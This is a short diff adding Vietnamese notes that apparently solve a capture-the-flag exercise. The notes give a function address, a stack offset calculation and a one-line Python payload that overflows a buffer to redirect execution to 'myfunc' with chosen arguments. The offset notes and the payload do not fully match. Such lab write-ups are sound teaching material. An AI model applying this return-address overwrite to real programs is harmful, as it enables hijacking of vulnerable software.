@@ -1,0 +1,5 @@
+địa chỉ  0x08048516 hàm myfunc
+
+100(của buffer)+4 (của ebp cũ) + 0x0000062d +4 (của tham số s) +p +q
+
+./ctf.out $(python -c "print('a'*104 + '\x16\x85\x04\x08' + 'b' * 4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
